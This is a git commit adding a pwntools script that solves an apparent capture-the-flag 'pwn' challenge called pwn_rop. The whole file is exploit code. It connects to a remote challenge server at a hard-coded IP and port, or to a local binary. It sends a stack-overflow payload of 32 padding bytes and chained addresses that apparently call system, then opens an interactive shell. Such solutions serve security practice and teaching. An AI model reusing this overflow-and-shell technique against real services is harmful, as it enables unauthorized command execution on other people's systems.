75888ab2accb4dbf59fff4ba283ef86c45bbbb4b
ywledoc <ywledoc@outlook.com>
2021-03-09 17:01:32 +0800

    增加pwn题目

---
+++ pwn_rop/pwn_rop.py
@@ -0,0 +1,25 @@
+#coding = utf-8
+#author = ywledoc
+
+from pwn import *
+import sys
+
+if sys.argv[1] == '1':
+    p = remote("114.116.54.89",  10004)
+else:
+    p = process("./pwn_rop")
+
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+context.log_level = "debug"
+#gdb.attach(proc.pidof(p)[0])
+
+elf = ELF("./pwn_rop")
+system_addr = elf.symbols["system"]
+print(hex(system_addr))
+
+#pause()
+payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401040) 
+payload += p64(0x402004)
+p.sendline(payload)
+
+p.interactive()
